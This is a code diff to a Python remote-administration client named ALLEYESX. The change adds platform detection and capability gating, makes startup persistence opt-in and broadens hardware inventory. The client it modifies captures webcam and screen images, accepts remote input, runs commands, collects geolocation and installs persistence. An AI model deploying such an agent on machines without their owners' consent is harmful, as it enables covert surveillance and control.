@@ -69,33 +69,79 @@ def get_device_payload():
         "mac": "",
     }
 
+def platform_kind():
+    """Return a stable platform label used for capability decisions."""
+    sysname = platform.system().lower()
+    release = platform.release().lower()
+    machine = platform.machine().lower()
+    if 'android' in release or os.environ.get('ANDROID_ROOT') or os.environ.get('PREFIX', '').find('com.termux') >= 0:
+        return 'android'
+    if sysname == 'ios' or 'iphone' in machine or 'ipad' in machine:
+        return 'ios'
+    if sys.platform == 'win32':
+        return 'windows'
+    if sys.platform == 'darwin':
+        return 'macos'
+    if sys.platform.startswith('linux'):
+        return 'linux'
+    return sysname or 'unknown'
+
+
+def capability_profile():
+    """Declare what this agent can attempt on the current OS.
+
+    iOS support is intentionally limited: regular iOS does not allow a Python
+    process to run as a persistent background telemetry/remote-admin agent.
+    The agent will still report basic identity when run inside a Python/iSH-like
+    environment, but screenshots, webcam, remote input and persistence are not
+    assumed available.
+    """
+    kind = platform_kind()
+    return {
+        'platform': kind,
+        'telemetry': True,
+        'hardware_inventory': kind in ('windows', 'linux', 'macos', 'android'),
+        'screenshot': kind in ('windows', 'linux', 'macos'),
+        'webcam': kind in ('windows', 'linux', 'macos', 'android'),
+        'remote_input': kind in ('windows', 'linux', 'macos'),
+        'persistence': kind in ('windows', 'linux', 'macos'),
+        'nmap': kind in ('windows', 'linux', 'macos', 'android'),
+        'limited_reason': 'iOS sandbox restrictions' if kind == 'ios' else '',
+    }
+
+
 def get_peripherals_info():
-    """
-    Returns a list of connected Plug-and-Play devices.
-    """
+    """Return connected peripherals using the best available OS method."""
+    devices = []
+    kind = platform_kind()
     try:
-        output = subprocess.check_output(
-            [
-                "wmic",
-                "path",
-                "Win32_PnPEntity",
-                "get",
-                "Name"
-            ],
-            universal_newlines=True
-        )
-
-        devices = []
-
-        for line in output.splitlines():
-            line = line.strip()
-            if line and line != "Name":
-                devices.append(line)
-
-        return devices
-
+        if kind == 'windows':
+            output = subprocess.check_output(
+                ['wmic', 'path', 'Win32_PnPEntity', 'get', 'Name'],
+                universal_newlines=True, timeout=12, stderr=subprocess.DEVNULL
+            )
+            return [line.strip() for line in output.splitlines() if line.strip() and line.strip() != 'Name']
+        if kind == 'linux':
+            if shutil.which('lsusb'):
+                output = subprocess.check_output(['lsusb'], text=True, timeout=8, stderr=subprocess.DEVNULL)
+                devices.extend([line.strip() for line in output.splitlines() if line.strip()])
+            by_id = '/dev/disk/by-id'
+            if os.path.isdir(by_id):
+                devices.extend([f'disk:{name}' for name in os.listdir(by_id)[:50]])
+            return devices or ['Not reported']
+        if kind == 'android':
+            if shutil.which('termux-usb'):
+                output = subprocess.check_output(['termux-usb', '-l'], text=True, timeout=8, stderr=subprocess.DEVNULL)
+                return [line.strip() for line in output.splitlines() if line.strip()] or ['Not reported']
+            return ['Not reported: install Termux:API for USB inventory']
+        if kind == 'macos':
+            output = subprocess.check_output(['system_profiler', 'SPUSBDataType', '-detailLevel', 'mini'], text=True, timeout=20, stderr=subprocess.DEVNULL)
+            return [line.strip() for line in output.splitlines() if line.strip() and ':' in line][:100] or ['Not reported']
+        if kind == 'ios':
+            return ['Not reported: iOS sandbox does not expose peripheral inventory to normal Python apps']
     except Exception as e:
-        return [f"Error: {e}"]
+        return [f'Not reported: {e}']
+    return ['Not reported']
 
 
 # ============================================================
@@ -242,12 +288,13 @@ def generate_device_id():
 # SYSTEM INFORMATION COLLECTION
 # ============================================================
 def get_system_info():
+    caps = capability_profile()
     info = {
         'device_id': DEVICE_ID,
-        'hostname': platform.node(),
+        'hostname': platform.node() or socket.gethostname() or 'Unknown',
         'ip': get_local_ip(),
-        'os': platform.system(),
-        'os_version': platform.release(),
+        'os': caps['platform'],
+        'os_version': platform.platform(),
         'cpu': get_cpu_info(),
         'ram': get_ram_info(),
         'ram_total': get_ram_total_gb(),
@@ -257,7 +304,8 @@ def get_system_info():
         'country': 'Unknown',
         'city': 'Unknown',
         'latitude': 0.0,
-        'longitude': 0.0
+        'longitude': 0.0,
+        'capabilities': caps,
     }
     try:
         loc = get_geo_location()
@@ -386,12 +434,13 @@ def collect_hardware_inventory():
     """Collect complete hardware inventory for device registration."""
     inventory = {
         'os': {
-            'name': platform.system(),
-            'version': platform.release(),
+            'name': platform_kind(),
+            'version': platform.platform(),
             'architecture': platform.machine(),
             'kernel_version': platform.version(),
             'boot_time': get_boot_time(),
         },
+        'capabilities': capability_profile(),
         'processor': collect_processor_info(),
         'memory': collect_memory_info(),
         'graphics': collect_gpu_info(),
@@ -1488,6 +1537,8 @@ _frame_height = 0
 
 def capture_screenshot():
     global _prev_frame_array, _frame_width, _frame_height
+    if not capability_profile().get('screenshot'):
+        return None
     
     try:
         import mss
@@ -1635,6 +1686,8 @@ def capture_subprocess_windows_full():
 # WEBCAM CAPTURE
 # ============================================================
 def capture_webcam():
+    if not capability_profile().get('webcam'):
+        return None
     try:
         import cv2
         cap = cv2.VideoCapture(0)
@@ -1884,6 +1937,8 @@ def execute_command(command):
 # TOUCH/MOUSE EVENT HANDLING
 # ============================================================
 def handle_touch_event(event_data):
+    if not capability_profile().get('remote_input'):
+        return False
     try:
         import pyautogui
     except ImportError:
@@ -1926,6 +1981,12 @@ def handle_touch_event(event_data):
 # PERSISTENCE
 # ============================================================
 def ensure_persistence():
+    if os.environ.get('ALLEYESX_ENABLE_PERSISTENCE') != '1':
+        print('[*] Persistence disabled. Set ALLEYESX_ENABLE_PERSISTENCE=1 to enable authorized startup registration.')
+        return False
+    if not capability_profile().get('persistence'):
+        print('[*] Persistence not supported on this platform profile.')
+        return False
     script_path = os.path.abspath(__file__)
     if sys.platform == 'win32':
         return persist_windows(script_path)
@@ -2234,7 +2295,11 @@ class ALLEYESXClient:
         """)
         print(f"[*] Device ID: {self.device_id}")
         print(f"[*] Server: {SERVER_URL}")
-        print(f"[*] Platform: {sys.platform}")
+        caps = capability_profile()
+        print(f"[*] Platform: {sys.platform} ({caps['platform']})")
+        print(f"[*] Capabilities: telemetry={caps['telemetry']} hardware={caps['hardware_inventory']} screenshot={caps['screenshot']} webcam={caps['webcam']} input={caps['remote_input']} nmap={caps['nmap']}")
+        if caps.get('limited_reason'):
+            print(f"[*] Limited mode: {caps['limited_reason']}")
         print(f"[*] Stream profile: {STREAM_PROFILE} ({STREAM_TARGET_FPS} FPS target)")
         print(f"[*] Screenshot: {1/SCREENSHOT_INTERVAL:.0f} FPS target")
         print(f"[*] Webcam: {1/WEBCAM_INTERVAL:.0f} FPS target")
